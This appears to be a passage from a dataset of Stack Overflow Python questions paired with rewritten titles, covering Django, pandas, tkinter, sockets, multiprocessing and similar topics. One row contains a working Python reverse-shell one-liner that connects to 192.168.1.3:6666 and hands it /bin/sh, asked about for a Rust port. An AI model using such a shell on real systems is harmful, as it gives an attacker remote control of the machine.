Django: 'myapp' is not a registered namespace," I have this error during template rendering. What i'm trying to do is allow the user to upload a csv then process the data into models.error at line 109'myapp' is not a registered namespaceThis is my line 109 code urls.py in mysite urls.py in anomaly <code>  <form action=""{% url ""myapp:upload_csv"" %}"" method=""POST"" enctype=""multipart/form-data"" class=""form-horizontal""> urlpatterns = [ url(r'^admin/', admin.site.urls), url(r'', include('anomaly.urls')),] urlpatterns = [ url(r'^$', views.post_list, name='post_list'), url(r'^upload/csv/$', views.upload_csv, name='upload_csv'),]",Django: NoReverseMatch at / 'myapp' is not a registered namespace
Keras: Add variables to progress bar," I'd like to monitor eg. the learning rate during training in Keras both in the progress bar and in Tensorboard. I figure there must be a way to specify which variables are logged, but there's no immediate clarification on this issue on the Keras website.I guess it's got something to do with creating a custom Callback function, however, it should be possible to modify the already existing progress bar callback, no? <code> ",How to add variables to progress bar in Keras?
Python: How to import modules without python-filename as submodule?," DescriptionAssume, I have a package with the following structure: Where __init__.py is empty andmodule1.py: setup.py is containing the usual context for making a package out of this, which can be installed with pip install -e pkgpath on the local system.In a script.py, I would have to do: My desired call would be: QuestionsHow can I 'organize' my package so that I can call functions, out of module1.py directly from abbr.function()? What code changes are required?Is this organization useful if the package grows? So that directories would act as the structure-element and python-files are just capsules to organize my functions within? What is the best way to organize functions in modules and sub-modules?Further thoughtsIs there a good reason not to have just one function in each python-file which can be used from the module? (and has the same name as the file)I assume, I will have to modify my __init__.py-files, but I couldn't figure out how.Clarification on questions 2 Calls should be: And not: <code>  package-folder |_ mypackage |_ __init__.py |_ module1.py setup.py def do_stuff(): print('Did stuff.') import mypackage as abbrabbr.module1.do_stuff()# output: Did stuff. abbr.do_stuff()# output: Did stuff. package-folder|_ mypackage |_ __init__.py |_ module1.py #with function do_stuff1() |_ subpackage |_module2.py #with function do_stuff2()setup.py abbr.do_stuff1()abbr.subpackage.do_stuff2() abbr.module1.do_stuff1()abbr.subpackage.module2.do_stuff2()",Python: How do I import modules without python-filename as submodule?
Merge Pandas Dataframes based off of date, I'm looking to merge two pandas DataFrames based on date. The issue is the 2nd dataframe does not include every date from the 1st dataframe. I need to use every date from df1 with the latest value from df2. The values from df2 will be used for multiple cells till there is a new value in df2.Thanks a lot for your time.  <code>  +-------------+---------------+-------------+| DataFrame 1 | | |+-------------+---------------+-------------+| Date | Sales loc1 | Sales loc2 || 1/1/17 | 100 | 95 || 1/2/17 | 125 | 124 || 1/3/17 | 115 | 152 || ... | | || 2/1/17 | 110 | 111 |+-------------+---------------+-------------++-------------+---------+------+| DataFrame 2 | | |+-------------+---------+------+| Date | exp | loc || 1/1/17 | 100 | 1 || 1/1/17 | 125 | 2 || 2/1/17 | 115 | 1 || 2/1/17 | 110 | 2 |+-------------+---------+------++---------------+---------------+--------------+------------+-------------+| New Dataframe | | | | |+---------------+---------------+--------------+------------+-------------+| Date | Sales loc1 | Sales loc2 | exp loc1 | exp loc2 || 1/1/17 | 100 | 95 | 100 | 125 || 1/2/17 | 125 | 124 | 100 | 125 || 1/3/17 | 115 | 152 | 100 | 125 || ... | | | | || 2/1/17 | 110 | 111 | 115 | 110 |+---------------+---------------+--------------+------------+-------------+,Merge Pandas Dataframes based on date
sort list accounting for None type in Python," I am trying to sort a list of objects using the date attribute with but some dates are just None, which means that I get the error is there a way to account for this? e.g. Have objects with date == None at the top or bottom of the sorted listor do I need to do this manually? <code>  list_of_objects.sort(key=lambda x: x.date, reverse=True) TypeError: can't compare datetime.datetime to NoneType",How to sort a list and handle None values properly?
OpenCV with Python Video Edge Detection 'TypeError'," I am trying to use OpenCV with Python in order to detect squares in a live video feed from a Raspberry Pi camera. However, the cv2.GaussianBlur and cv2.Canny functions in the code below are causing the following error: ""TypeError: numpy.ndarray' object is not callable"".I cannot seem to resolve the error. Any help is appreciated. Code taken from https://www.pyimagesearch.com/2015/05/04/target-acquired-finding-targets-in-drone-and-quadcopter-video-streams-using-python-and-opencv/#comment-446639 <code>  import cv2# load the videocamera = cv2.VideoCapture(0)# keep loopingwhile True: # grab the current frame and initialize the status text (grabbed, frame) = camera.read() status = ""No Targets"" # check to see if we have reached the end of the # video if not grabbed: break # convert the frame to grayscale, blur it, and detect edges gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY) blurred = cv2.GaussianBlur(gray, (7, 7), 0) edged = cv2.Canny(blurred, 50, 150) # find contours in the edge map (cnts, _) = cv2.findContours(edged.copy(), cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE) # loop over the contours for c in cnts: # approximate the contour peri = cv2.arcLength(c, True) approx = cv2.approxPolyDP(c, 0.01 * peri, True) # ensure that the approximated contour is ""roughly"" rectangular if len(approx) >= 4 and len(approx) <= 6: # compute the bounding box of the approximated contour and # use the bounding box to compute the aspect ratio (x, y, w, h) = cv2.boundingRect(approx) aspectRatio = w / float(h) # compute the solidity of the original contour area = cv2.contourArea(c) hullArea = cv2.contourArea(cv2.convexHull(c)) solidity = area / float(hullArea) # compute whether or not the width and height, solidity, and # aspect ratio of the contour falls within appropriate bounds keepDims = w > 25 and h > 25 keepSolidity = solidity > 0.9 keepAspectRatio = aspectRatio >= 0.8 and aspectRatio <= 1.2 # ensure that the contour passes all our tests if keepDims and keepSolidity and keepAspectRatio: # draw an outline around the target and update the status # text cv2.drawContours(frame, [approx], -1, (0, 0, 255), 4) status = ""Target(s) Acquired"" # draw the status text on the frame cv2.putText(frame, status, (20, 30), cv2.FONT_HERSHEY_SIMPLEX, 0.5, (0, 0, 255), 2) # show the frame and record if a key is pressed cv2.imshow(""Frame"", frame) key = cv2.waitKey(1) & 0xFF # if the 'q' key is pressed, stop the loop if key == ord(""q""): break# cleanup the camera and close any open windowscamera.release()cv2.destroyAllWindows()",How to use `cv2.findContours` in different OpenCV versions?
"Python: Do I have to ""unbind"" socket after binding free socket?"," Do I have to explicitly release/unbind a socket so that it can be reused? I'm thinking of using close() but I have seen some options like tcp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1). Do I have to use it or is close() enough? Is there any way to make sure that port is free for new bind? <code>  TorPorts = {}def port_setup(workers): for worker in range(workers): for i in range(2): tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM) tcp.bind(('', 0)) port = tcp.getsockname()[1] print(""{0} port {1}, tcp {2}"".format(i,port,tcp)) if not TorPorts.has_key(worker): TorPorts[worker] = {0:{},1:{}} TorPorts[worker][i] = {""port"":port,""tcp"":tcp} # do some programing # close ports I s this enough? for thread,ports in TorPorts[0].items(): tcp_port = ports[""tcp""] tcp_port.close()","Do I have to ""unbind"" socket after binding free socket?"
ValueError and TypeErrorin python, I can't completely understand the difference between Type and Value error in Python3x. Why do we get a ValueError when I try float('string') instead of TypeError? shouldn't this give also a TypeError because I am passing a variable of type 'str' to be converted into float? <code>  In [169]: float('string')---------------------------------------------------------------------------ValueError Traceback (most recent call last)<ipython-input-169-f894e176bff2> in <module>()----> 1 float('string')ValueError: could not convert string to float: 'string',ValueError and TypeError in python
Pandas groupby diff," So my dataframe looks like this: Each site has a different score depending on the country. I'm trying to find the 1/3/5-day difference of scores for each site/country combination.Output should be: I first tried sorting by site/country/date, then grouping by site and country but I'm not able to wrap my head around getting a difference from a grouped object. <code>  date site country score0 2018-01-01 google us 1001 2018-01-01 google ch 502 2018-01-02 google us 703 2018-01-03 google us 604 2018-01-02 google ch 105 2018-01-01 fb us 506 2018-01-02 fb us 557 2018-01-03 fb us 1008 2018-01-01 fb es 1009 2018-01-02 fb gb 100 date site country score diff8 2018-01-01 fb es 100 0.09 2018-01-02 fb gb 100 0.05 2018-01-01 fb us 50 0.06 2018-01-02 fb us 55 5.07 2018-01-03 fb us 100 45.01 2018-01-01 google ch 50 0.04 2018-01-02 google ch 10 -40.00 2018-01-01 google us 100 0.02 2018-01-02 google us 70 -30.03 2018-01-03 google us 60 -10.0",Pandas groupby multiple fields then diff
Is it possible to count the number of occurrences of a certain value in a dictionary in python?," If I have got something like this: If I want for example to count the number of occurrences for the ""0"" as a value without having to iterate the whole list, is that even possible and how? <code>  D = {'a': 97, 'c': 0 , 'b':0,'e': 94, 'r': 97 , 'g':0}",count the number of occurrences of a certain value in a dictionary in python?
"Why is there a ""class"" keyword in front of description of built-in function?"," The Python docs lists property() as a built-in function.However, the function description has the keyword ""class"" in front of it in the docs. class property(fget=None, fset=None, fdel=None, doc=None) This also happens with class set([iterable])and class slice(stop)What does this mean? - why are classes listed under built-in functions. Is this just a documentation issue or is there a technical reason?EDIT: I am not asking about how property() works. <code> ",Python - Why are classes listed in the list of built-in functions?
save numpy ndarray as .csv file error:," I created a numpy array as follows: The values in ab are shown below: When I try to save ab as a .csv file using savetxt() command, I get below error  <code>  import numpy as npnames = np.array(['NAME_1', 'NAME_2', 'NAME_3'])floats = np.array([ 0.1234 , 0.5678 , 0.9123 ])ab = np.zeros(names.size, dtype=[('var1', 'U6'), ('var2', float)])ab['var1'] = namesab['var2'] = floats array([(u'NAME_1', 0.1234), (u'NAME_2', 0.5678), (u'NAME_3', 0.9123)], dtype=[('var1', '<U6'), ('var2', '<f8')]) np.savetxt('D:\test.csv',ab,delimiter=',') ---------------------------------------------------------------------------TypeError Traceback (most recent call last)<ipython-input-66-a71fd201aefe> in <module>()----> 1 np.savetxt('D:\Azim\JF-Mapping-workflow-CRM\Backup\delete.csv',ab,delimiter=',')c:\python27\lib\site-packages\numpy\lib\npyio.pyc in savetxt(fname, X, fmt, delimiter, newline, header, footer, comments) 1256 raise TypeError(""Mismatch between array dtype ('%s') and "" 1257 ""format specifier ('%s')""-> 1258 % (str(X.dtype), format)) 1259 if len(footer) > 0: 1260 footer = footer.replace('\n', '\n' + comments)TypeError: Mismatch between array dtype ('[('var1', '<U6'), ('var2', '<f8')]') and format specifier ('%.18e,%.18e')",How to save numpy ndarray as .csv file?
adjust all nested lists to same length," I am referring to this this specific answer Making nested lists same length. Since I don't have the permissions to comment yet and answering with a question to that topic would violate the rules, I am asking a new question. I don't fully understand the answer.In my understanding the iterator row in the for-loop is usually an integer value which iterates over each element in myList. So how is it possible to use len(row) as part of the condition since it is just an integer? Is there something I am missing? I have tried to apply this solution to my code but as expected I receive an error saying referring to this line Further I don't understand the use of .extend with row which is the iterator and not a list. Here is the relevant part from the answer. A brief walkthrough would be greatly appreciated. Or maybe there is a better way to adjust the lengths of all nested list to same length. <code>  TypeError: object of type 'int' has no len() args = (""object of type 'int' has no len()"",) with_traceback = <built-in method with_traceback of TypeError object> row.extend(['null'*(len(maxSS7) - len(row))]) maxLen = max(map(len, myList))for row in myList: if len(row) < maxLen: row.extend(...)",Adjust all nested lists to the same length
pandas output to csv is not opening when index=False," Hi I can export and open the csv file in windows if I do:y.to_csv('sample.csv'). where y is a pandas dataframe.However, this output file has an index column. I am able to export the output file to csv by doing:y.to_csv('sample.csv',index=False)But when I try to open the file is showing an error message:""The file format and extension of 'sample.csv' don't match. The file could be corrupted or unsafe. Unless you trust it's source, don't open it. Do you want to open it anyway?""Sample of y: <code> ",Excel is not opening csv file when index=False option is selected in to_csv command
installing pyaudio using pip3," I got the following error while trying to install pyaudio using pip3 in ubuntu 16.04: <code>  Collecting pyaudio Downloading PyAudio-0.2.11.tar.gzInstalling collected packages: pyaudio Running setup.py install for pyaudio ... error Complete output from command /usr/bin/python3 -u -c ""import setuptools, tokenize;__file__='/tmp/pip-build-mxgvewdb/pyaudio/setup.py';f=getattr(tokenize, 'open', open)(__file__);code=f.read().replace('\r\n', '\n');f.close();exec(compile(code, __file__, 'exec'))"" install --record /tmp/pip-v55chjee-record/install-record.txt --single-version-externally-managed --compile: running install running build running build_py creating build creating build/lib.linux-x86_64-3.5 copying src/pyaudio.py -> build/lib.linux-x86_64-3.5 running build_ext building '_portaudio' extension creating build/temp.linux-x86_64-3.5 creating build/temp.linux-x86_64-3.5/src x86_64-linux-gnu-gcc -pthread -DNDEBUG -g -fwrapv -O2 -Wall -Wstrict-prototypes -g -fstack-protector-strong -Wformat -Werror=format-security -Wdate-time -D_FORTIFY_SOURCE=2 -fPIC -I/usr/include/python3.5m -c src/_portaudiomodule.c -o build/temp.linux-x86_64-3.5/src/_portaudiomodule.o src/_portaudiomodule.c:29:23: fatal error: portaudio.h: No such file or directory compilation terminated. error: command 'x86_64-linux-gnu-gcc' failed with exit status 1 ----------------------------------------Command ""/usr/bin/python3 -u -c ""import setuptools, tokenize;__file__='/tmp/pip-build-mxgvewdb/pyaudio/setup.py';f=getattr(tokenize, 'open', open)(__file__);code=f.read().replace('\r\n', '\n');f.close();exec(compile(code, __file__, 'exec'))"" install --record /tmp/pip-v55chjee-record/install-record.txt --single-version-externally-managed --compile"" failed with error code 1 in /tmp/pip-build-mxgvewdb/pyaudio/",portaudio.h: No such file or directory
How do I specify multiple types for a parameter using type-hints?," I have a Python function which accepts XML data as an str.For convenience, the function also checks for xml.etree.ElementTree.Element and will automatically convert to str if necessary. Is it possible to specify with type-hints that a parameter can be given as one of two types? <code>  import xml.etree.ElementTree as ETdef post_xml(data: str): if type(data) is ET.Element: data = ET.tostring(data).decode() # ... def post_xml(data: str or ET.Element): # ...",How do I specify multiple types for a parameter using type-hints?
Is there a await getkey() module in python?," I really need an asyncio compatible getkey() so I can So when the coroutine stuff hits the await our loop stops the task, and continues on another one.I am new to coding but there sure is such a thing somewhere?If not, it is possible to build such a coroutine or not?The getkey() could return the pressed key value in any form.But it should have cbreak and noecho on (Don't wait for enter and Don't print the pressed key).(clarification, no real need to continue read.)please help me^^ I know, that this way of doing it seems unusual. Curses running in it's own thread would be the right way to go. But I can use curses only for displaying.. also I am really new to coding.. and I have no time to look into this threading thing:/ I just need my 100 lines to work fluently really fast and also only once :!  <code>  async def stuff(): await getkey()",Is there a way to getkey()/ getchar() asynchronously in python?
Is there an await getkey() module in python?," I really need an asyncio compatible getkey() so I can So when the coroutine stuff hits the await our loop stops the task, and continues on another one.I am new to coding but there sure is such a thing somewhere?If not, it is possible to build such a coroutine or not?The getkey() could return the pressed key value in any form.But it should have cbreak and noecho on (Don't wait for enter and Don't print the pressed key).(clarification, no real need to continue read.)please help me^^ I know, that this way of doing it seems unusual. Curses running in it's own thread would be the right way to go. But I can use curses only for displaying.. also I am really new to coding.. and I have no time to look into this threading thing:/ I just need my 100 lines to work fluently really fast and also only once :!  <code>  async def stuff(): await getkey()",Is there a way to getkey()/ getchar() asynchronously in python?
Creating a python loop to drop dtype object from Series," I've got a pandas dataframe and I'm trying to drop all the object fields from so that I'm left with only numeric.I've been trying to write a for loop to do this task, as I'm likely going to need to do it over and over again with different data. For some reason I can't get it working. Below is what I've did so far The error I get is: AttributeError Traceback (most recent call last) in () 1 for cols in data: ----> 2 if data.values.type == object: 3 numdata = data.drop(axis=1, inplace=True) AttributeError: 'numpy.ndarray' object has no attribute 'type'I am a newb and for some reason I can't get the for loop and if statement logic to stick in my head. <code>  for cols in data: if data.values.type == object: numdata = data.drop(axis=1, inplace=True)",How to drop DataFrame columns based on dtype
Max return of 3 item tuples incorrect," I have a list of of tuples that represent different times I want to return the max from the list, after some searching I realized I could use the key in max to search by the AM or PM first.print(max(timeList, key = operator.itemgetter(2)))When I run this however, I'm getting the wrong max ('4', '12', 'PM') I thought about it, and not only does it not make sense, given that 8:23 should be max, but I also realized that 12:48 would probably return max since it's a PM and also technically greater than 8 in my search.That being said, how might I get this max to find the latest possible time, given formatting of the list can not be changed.  <code>  timeList = [('4', '12', 'PM'), ('8', '23', 'PM'), ('4', '03', 'AM'), ('1', '34', 'AM'), ('12', '48', 'PM'), ('4', '13', 'AM'), ('11', '09', 'AM'), ('3', '12', 'PM'), ('4', '10', 'PM')]","Find maximum value of time in list containing tuples of time in format ('hour', 'min', 'AM/PM')"
Mathematical operation in dict," I have a dictionary S as: And an array D1_inv as: I need to obtain a product of all the items in S and D1_inv. For example, for S[1]: and for S[2]: Can somebody help me create a loop so that I can store all these products in a dict like S?  <code>  {1: [11.1, 13, 15.0], 2: [6.9, 8.5, 10.17], 3: [3.86, 4.83, 6.07], 4: [3.86, 4.83, 6.07], 5: [2.31, 2.58, 3.02]} [0.0248, 0.0296, 0.0357] [round(i*j,4) for i,j in zip(S[1],D1_inv)]Out[282]: [0.2753, 0.3848, 0.5355] [round(i*j,4) for i,j in zip(S[2],D1_inv)]Out[283]: [0.1711, 0.2516, 0.3631]","Perform operation on all ""key"":""value"" pair in dict and store the result in a new dict object"
What is the Rust equivalent of Python reverse shell script?," A reverse shell script in Python normally looks something like this: I am trying to duplicate this process with Rust: I only got as far as getting a TCP connection to my host machine, listening with netcat (nc -l -p 6666). If I understand correctly, I need to redirect standard input, output, and error, through the socket and then somehow ""call"" /bin/sh. How do I write this reverse shell script in Rust? <code>  import socket, subprocess, os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""192.168.1.3\"", 6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\""/bin/sh\"", \""-i\""]); let mut stream = std::net::TcpStream::connect(""192.168.1.3:6666"").unwrap();",What is the Rust equivalent of a reverse shell script written in Python?
How can I make a tkinter messagebox with a button to show error details?," I have a Python script which uses tkinter.messagebox to display an error message with traceback details if an unexpected exception occurs. Displaying tracebacks this way has a few drawbacks.Traceback details aren't helpful for the average user.Testers can't easily select and copy text from a messageboxComplex errors can have large tracebacks which span dozens of lines.Instead of displaying error details by default, I would like to add a ""show details"" button which would display more information in a read-only text field.How can I add a ""show details"" button to a tkinter messagebox? <code>  import tkinter.messagebox as tmimport tracebacktry: 1/0except Exception as error: tm.showerror(title=""Error"", message=""An error has occurred: '"" + str(error) + ""'."", detail=traceback.format_exc())","How can I add a ""show details"" button to a tkinter messagebox?"
How to create a tkinter messagebox with a button to show error details?," I have a Python script which uses tkinter.messagebox to display an error message with traceback details if an unexpected exception occurs. Displaying tracebacks this way has a few drawbacks.Traceback details aren't helpful for the average user.Testers can't easily select and copy text from a messageboxComplex errors can have large tracebacks which span dozens of lines.Instead of displaying error details by default, I would like to add a ""show details"" button which would display more information in a read-only text field.How can I add a ""show details"" button to a tkinter messagebox? <code>  import tkinter.messagebox as tmimport tracebacktry: 1/0except Exception as error: tm.showerror(title=""Error"", message=""An error has occurred: '"" + str(error) + ""'."", detail=traceback.format_exc())","How can I add a ""show details"" button to a tkinter messagebox?"
How can I create a tkinter messagebox with a button to show error details?," I have a Python script which uses tkinter.messagebox to display an error message with traceback details if an unexpected exception occurs. Displaying tracebacks this way has a few drawbacks.Traceback details aren't helpful for the average user.Testers can't easily select and copy text from a messageboxComplex errors can have large tracebacks which span dozens of lines.Instead of displaying error details by default, I would like to add a ""show details"" button which would display more information in a read-only text field.How can I add a ""show details"" button to a tkinter messagebox? <code>  import tkinter.messagebox as tmimport tracebacktry: 1/0except Exception as error: tm.showerror(title=""Error"", message=""An error has occurred: '"" + str(error) + ""'."", detail=traceback.format_exc())","How can I add a ""show details"" button to a tkinter messagebox?"
How can I create a tkinter messagebox with a button to show error details?," I have a Python script which uses tkinter.messagebox to display an error message with traceback details if an unexpected exception occurs. Displaying tracebacks this way has a few drawbacks.Traceback details aren't helpful for the average user.Testers can't easily select and copy text from a messageboxComplex errors can have large tracebacks which span dozens of lines.Instead of displaying error details by default, I would like to add a ""show details"" button which would display more information in a read-only text field.How can I add a ""show details"" button to a tkinter messagebox? <code>  import tkinter.messagebox as tmimport tracebacktry: 1/0except Exception as error: tm.showerror(title=""Error"", message=""An error has occurred: '"" + str(error) + ""'."", detail=traceback.format_exc())","How can I add a ""show details"" button to a tkinter messagebox?"
Python property descriptor design," I was looking at how Python implements the property descriptor internally. According to the docs property() is implemented in terms of the descriptor protocol, reproducing it here for convenience: My question is: why aren't the last three methods implemented as follows: Is there a reason for returing new instances of property, internally pointing to basically the same get and set functions? <code>  class Property(object): ""Emulate PyProperty_Type() in Objects/descrobject.c"" def __init__(self, fget=None, fset=None, fdel=None, doc=None): self.fget = fget self.fset = fset self.fdel = fdel if doc is None and fget is not None: doc = fget.__doc__ self.__doc__ = doc def __get__(self, obj, objtype=None): if obj is None: return self if self.fget is None: raise AttributeError(""unreadable attribute"") return self.fget(obj) def __set__(self, obj, value): if self.fset is None: raise AttributeError(""can't set attribute"") self.fset(obj, value) def __delete__(self, obj): if self.fdel is None: raise AttributeError(""can't delete attribute"") self.fdel(obj) def getter(self, fget): return type(self)(fget, self.fset, self.fdel, self.__doc__) def setter(self, fset): return type(self)(self.fget, fset, self.fdel, self.__doc__) def deleter(self, fdel): return type(self)(self.fget, self.fset, fdel, self.__doc__) def getter(self, fget): self.fget = fget return self def setter(self, fset): self.fset = fset return self def deleter(self, fdel): self.fdel= fdel return self",Python property descriptor design: why copy rather than mutate?
More succinct way to set conditional cell value pandas dataframe?," I have this code (which works) - a bunch of nested conditional statements to set the value in the 'paragenesis1' row of a dataframe (myOxides['cpx']), depending on the values in various other rows of the frame.I'm very new to python and programming in general. I am thinking that I should write a function to perform this, but how then to apply that function elementwise? This is the only way I have found to avoid the 'truth value of a series is ambiguous' error.Any help greatly appreciated! or; <code>  myOxides['cpx'].loc['paragenesis1'] = np.where( ((cpxCrOx>=0.5) & (cpxAlOx<=4)), ""GtPeridA"", np.where( ((cpxCrOx>=2.25) & (cpxAlOx<=5)), ""GtPeridB"", np.where( ((cpxCrOx>=0.5)& (cpxCrOx<=2.25)) & ((cpxAlOx>=4) & (cpxAlOx<=6)), ""SpLhzA"", np.where( ((cpxCrOx>=0.5) & (cpxCrOx<=(5.53125 - 0.546875 * cpxAlOx))) & ((cpxAlOx>=4) & (cpxAlOx <= ((cpxCrOx - 5.53125)/ -0.546875))), ""SpLhzB"", ""Eclogite, Megacryst, Cognate"")))) df.loc['a'] = np.where( (some_condition), ""value"", np.where( ((conditon_1) & (condition_2)), ""some_value"", np.where( ((condition_3)& (condition_4)), ""some_other_value"", np.where( ((condition_5), ""another_value"", ""other_value""))))",Alternative to nested np.where in Pandas DataFrame
Hijacking print statements in python," Note: This question is for informational purposes only. I am interested to see how deep into Python's internals it is possible to go with this.Not very long ago, a discussion began inside a certain question regarding whether the strings passed to print statements could be modified after/during the call to print has been made. For example, consider the function: Now, when print is run, then the output to the terminal should display: Notice the word ""cat"" has been replaced by the word ""dog"". Something somewhere somehow was able to modify those internal buffers to change what was printed. Assume this is done without the original code author's explicit permission (hence, hacking/hijacking).This comment from the wise @abarnert, in particular, got me thinking: There are a couple of ways to do that, but they're all very ugly, and should never be done. The least ugly way is to probably replace the code object inside the function with one with a different co_consts list. Next is probably reaching into the C API to access the str's internal buffer. [...]So, it looks like this is actually possible.Here's my naive way of approaching this problem: Of course, exec is bad, but that doesn't really answer the question, because it does not actually modify anything during when/after print is called.How would it be done as @abarnert has explained it? <code>  def print_something(): print('This cat was scared.') This dog was scared. >>> import inspect>>> exec(inspect.getsource(print_something).replace('cat', 'dog'))>>> print_something()This dog was scared.","Is it possible to ""hack"" Python's print function?"
"Is it possible to ""hack"" python's print statement?"," Note: This question is for informational purposes only. I am interested to see how deep into Python's internals it is possible to go with this.Not very long ago, a discussion began inside a certain question regarding whether the strings passed to print statements could be modified after/during the call to print has been made. For example, consider the function: Now, when print is run, then the output to the terminal should display: Notice the word ""cat"" has been replaced by the word ""dog"". Something somewhere somehow was able to modify those internal buffers to change what was printed. Assume this is done without the original code author's explicit permission (hence, hacking/hijacking).This comment from the wise @abarnert, in particular, got me thinking: There are a couple of ways to do that, but they're all very ugly, and should never be done. The least ugly way is to probably replace the code object inside the function with one with a different co_consts list. Next is probably reaching into the C API to access the str's internal buffer. [...]So, it looks like this is actually possible.Here's my naive way of approaching this problem: Of course, exec is bad, but that doesn't really answer the question, because it does not actually modify anything during when/after print is called.How would it be done as @abarnert has explained it? <code>  def print_something(): print('This cat was scared.') This dog was scared. >>> import inspect>>> exec(inspect.getsource(print_something).replace('cat', 'dog'))>>> print_something()This dog was scared.","Is it possible to ""hack"" Python's print function?"
"Is it possible to ""hack"" python's print function?"," Note: This question is for informational purposes only. I am interested to see how deep into Python's internals it is possible to go with this.Not very long ago, a discussion began inside a certain question regarding whether the strings passed to print statements could be modified after/during the call to print has been made. For example, consider the function: Now, when print is run, then the output to the terminal should display: Notice the word ""cat"" has been replaced by the word ""dog"". Something somewhere somehow was able to modify those internal buffers to change what was printed. Assume this is done without the original code author's explicit permission (hence, hacking/hijacking).This comment from the wise @abarnert, in particular, got me thinking: There are a couple of ways to do that, but they're all very ugly, and should never be done. The least ugly way is to probably replace the code object inside the function with one with a different co_consts list. Next is probably reaching into the C API to access the str's internal buffer. [...]So, it looks like this is actually possible.Here's my naive way of approaching this problem: Of course, exec is bad, but that doesn't really answer the question, because it does not actually modify anything during when/after print is called.How would it be done as @abarnert has explained it? <code>  def print_something(): print('This cat was scared.') This dog was scared. >>> import inspect>>> exec(inspect.getsource(print_something).replace('cat', 'dog'))>>> print_something()This dog was scared.","Is it possible to ""hack"" Python's print function?"
How to list all installed kernels in conda?," Listing all the available environments is as simple as: Now how does one list the currently installed kernels, without having to go to the path: <code>  $ conda env list $ ls /home/{{user}}/.local/share/jupyter/kernels/",How to list all installed Jupyter kernels?
Django Model's DateTimeField is taking UTC even when TZ is Asia/Calcutta everywhere," I am using Django 1.11. My settings.py has following configured: which is IST (Indian Standard Time). My system is set to IST. MySQL current_time returns IST, Django's server when running, shows timestamp in IST. Python's datetime.now() also gives IST.Now the problem is, my models.py has following fields: and the database is MySQL. When I insert any record in it, the timestamps are in UTC. I was thinking of adding some middleware, as suggested by this answer, but that doesn't feel to be the recommended way. Why is it taking UTC even when everywhere IST has been configured? Am I missing some config that needs to be set separately for models?Please note that this question is not similar to what I require. I want to change the overall timezone, so that it is effective in model's too. <code>  TIME_ZONE = 'Asia/Calcutta'USE_I18N = TrueUSE_L10N = TrueUSE_TZ = True created_at = models.DateTimeField(auto_now_add=True)updated_at = models.DateTimeField(auto_now=True)",Django Model's DateTimeField is taking UTC even when timezone is Asia/Calcutta everywhere
How to solve memory issues problems while multiprocessing using Pool.map()?," I have written the program (below) to:read a huge text file as pandas dataframethen groupby using a specific column value to split the data and store as list of dataframes.then pipe the data to multiprocess Pool.map() to process each dataframe in parallel.Everything is fine, the program works well on my small test dataset. But, when I pipe in my large data (about 14 GB), the memory consumption exponentially increases and then freezes the computer or gets killed (in HPC cluster). I have added codes to clear the memory as soon as the data/variable isn't useful. I am also closing the pool as soon as it is done. Still with 14 GB input I was only expecting 2*14 GB memory burden, but it seems like lot is going on. I also tried to tweak using chunkSize and maxTaskPerChild, etc but I am not seeing any difference in optimization in both test vs. large file.I think improvements to this code is/are required at this code position, when I start multiprocessing. p = Pool(3) # number of pool to run at once; default at 1 result = p.map(matrix_to_vcf, list(gen_matrix_df_list.values()))but, I am posting the whole code.Test example: I created a test file (""genome_matrix_final-chr1234-1mb.txt"") of upto 250 mb and ran the program. When I check the system monitor I can see that memory consumption increased by about 6 GB. I am not so clear why so much memory space is taken by 250 mb file plus some outputs. I have shared that file via drop box if it helps in seeing the real problem. https://www.dropbox.com/sh/coihujii38t5prd/AABDXv8ACGIYczeMtzKBo0eea?dl=0 Can someone suggest, How I can get rid of the problem?My python script: Update for bounty hunters:I have achieved multiprocessing using Pool.map() but the code is causing a big memory burden (input test file ~ 300 mb, but memory burden is about 6 GB). I was only expecting 3*300 mb memory burden at max. Can somebody explain, What is causing such a huge memory requirement for such a small file and for such small length computation. Also, i am trying to take the answer and use that to improve multiprocess in my large program. So, addition of any method, module that doesn't change the structure of computation part (CPU bound process) too much should be fine. I have included two test files for the test purposes to play with the code. The attached code is full code so it should work as intended as it is when copied-pasted. Any changes should be used only to improve optimization in multiprocessing steps. <code>  #!/home/bin/python3import pandas as pdimport collectionsfrom multiprocessing import Poolimport ioimport timeimport resourceprint()print('Checking required modules')print()''' change this input file name and/or path as need be '''genome_matrix_file = ""genome_matrix_final-chr1n2-2mb.txt"" # test file 01genome_matrix_file = ""genome_matrix_final-chr1234-1mb.txt"" # test file 02#genome_matrix_file = ""genome_matrix_final.txt"" # large file def main(): with open(""genome_matrix_header.txt"") as header: header = header.read().rstrip('\n').split('\t') print() time01 = time.time() print('starting time: ', time01) '''load the genome matrix file onto pandas as dataframe. This makes is more easy for multiprocessing''' gen_matrix_df = pd.read_csv(genome_matrix_file, sep='\t', names=header) # now, group the dataframe by chromosome/contig - so it can be multiprocessed gen_matrix_df = gen_matrix_df.groupby('CHROM') # store the splitted dataframes as list of key, values(pandas dataframe) pairs # this list of dataframe will be used while multiprocessing gen_matrix_df_list = collections.OrderedDict() for chr_, data in gen_matrix_df: gen_matrix_df_list[chr_] = data # clear memory del gen_matrix_df '''Now, pipe each dataframe from the list using map.Pool() ''' p = Pool(3) # number of pool to run at once; default at 1 result = p.map(matrix_to_vcf, list(gen_matrix_df_list.values())) del gen_matrix_df_list # clear memory p.close() p.join() # concat the results from pool.map() and write it to a file result_merged = pd.concat(result) del result # clear memory pd.DataFrame.to_csv(result_merged, ""matrix_to_haplotype-chr1n2.txt"", sep='\t', header=True, index=False) print() print('completed all process in ""%s"" sec. ' % (time.time() - time01)) print('Global maximum memory usage: %.2f (mb)' % current_mem_usage()) print()'''function to convert the dataframe from genome matrix to desired output '''def matrix_to_vcf(matrix_df): print() time02 = time.time() # index position of the samples in genome matrix file sample_idx = [{'10a': 33, '10b': 18}, {'13a': 3, '13b': 19}, {'14a': 20, '14b': 4}, {'16a': 5, '16b': 21}, {'17a': 6, '17b': 22}, {'23a': 7, '23b': 23}, {'24a': 8, '24b': 24}, {'25a': 25, '25b': 9}, {'26a': 10, '26b': 26}, {'34a': 11, '34b': 27}, {'35a': 12, '35b': 28}, {'37a': 13, '37b': 29}, {'38a': 14, '38b': 30}, {'3a': 31, '3b': 15}, {'8a': 32, 